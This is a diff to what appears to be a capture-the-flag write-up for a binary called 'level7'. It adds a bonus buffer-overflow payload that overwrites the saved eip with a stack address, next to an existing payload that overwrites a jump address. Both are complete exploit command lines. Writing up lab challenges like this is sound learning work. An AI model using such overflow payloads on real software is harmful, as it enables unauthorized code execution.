@@ -26,3 +26,11 @@ And here we are :
 ```bash 
 ./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1] + " " + "\x08\x04\x84\xf4"[::-1]')
 ```
+
+### Bonus
+
+We managed to make it work by overwriting `eip` in the stack, but since the stack size is variable notably between `gdb` and direct calls, it can be hit or miss:
+
+```bash
+./level7 $(python -c 'print "A" * 20 + "\xbf\xff\xf7\x3c"[::-1] + " " + "\x08\x04\x84\xf4"[::-1] + "A"')
+```
